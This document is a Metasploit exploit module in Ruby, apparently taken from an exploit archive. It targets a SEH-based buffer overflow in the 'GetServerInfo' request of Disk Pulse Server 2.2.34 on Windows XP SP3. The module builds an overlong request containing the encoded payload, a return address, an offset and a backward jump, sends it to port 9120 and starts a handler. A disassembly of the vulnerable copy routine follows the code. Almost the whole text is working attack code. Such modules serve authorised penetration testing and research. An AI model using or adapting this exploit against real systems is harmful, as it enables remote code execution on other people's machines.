 
class MetasploitModule < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Disk Pulse Server \&#039;GetServerInfo\&#039; Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow vulnerability found
                    in libpal.dll of Disk Pulse Server v2.2.34. The overflow
                    is triggered when sending an overly long &#039;GetServerInfo&#039;
                    request to the service listening on port 9120.
            },
            &#039;Author&#039;         => [ &#039;James Fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;43919&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.saintcorporation.com/cgi-bin/exploit_info/disk_pulse_getserverinfo&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.coresecurity.com/content/disk-pulse-server-getserverinfo-request-buffer-overflow-exploit-10-5&#039; ]
                ],
            &#039;Privileged&#039;     => true,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039; => 300,
                    &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
                    &#039;DisableNops&#039; => &#039;True&#039;,
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;Compat&#039;    =>
                        {
                            &#039;SymbolLookup&#039; => &#039;ws2ord&#039;,
                        }
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ 
                        &#039;Windows XP SP3 EN&#039;, 
                            { 
                                # p/p/r 
                                # libspp.dll
                                &#039;Ret&#039; => 0x1006f71f,
                                &#039;Offset&#039; => 303
                            } 
                    ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Oct 19 2010&#039;))
 
        register_options([Opt::RPORT(9120)], self.class)
    end
 
    def exploit
        connect
 
        sploit =  "GetServerInfo"
        sploit << "\x41" * 8
        sploit << payload.encoded
        sploit << "\x42" * (303 - (8 + payload.encoded.length))
        sploit << generate_seh_record(target.ret)
        sploit << make_nops(4)
        sploit << "\xe9\xc4\xfe\xff\xff" # jmp $-311
        sploit << rand_text_alpha_upper(200)
 
        print_status("Trying target #{target.name}...")
 
        sock.put(sploit)
 
        handler
        disconnect
    end
 
end
__END__
0033C05C   55               PUSH EBP
0033C05D   8B6C24 1C        MOV EBP,DWORD PTR SS:[ESP+1C]
0033C061   3AC2             CMP AL,DL
0033C063   74 14            JE SHORT libpal.0033C079
0033C065   3C 0D            CMP AL,0D
0033C067   74 10            JE SHORT libpal.0033C079
0033C069   3C 0A            CMP AL,0A
0033C06B   74 0C            JE SHORT libpal.0033C079
0033C06D   41               INC ECX
0033C06E   88042F           MOV BYTE PTR DS:[EDI+EBP],AL
0033C071   47               INC EDI
0033C072   8A0431           MOV AL,BYTE PTR DS:[ECX+ESI]
0033C075   84C0             TEST AL,AL
0033C077  ^75 E8            JNZ SHORT libpal.0033C061
0033C079   C6042F 00        MOV BYTE PTR DS:[EDI+EBP],0
0033C07D   5D               POP EBP
0033C07E   5F               POP EDI
0033C07F   890B             MOV DWORD PTR DS:[EBX],ECX
0033C081   5E               POP ESI
0033C082   B8 01000000      MOV EAX,1
0033C087   5B               POP EBX
0033C088   C3               RETN

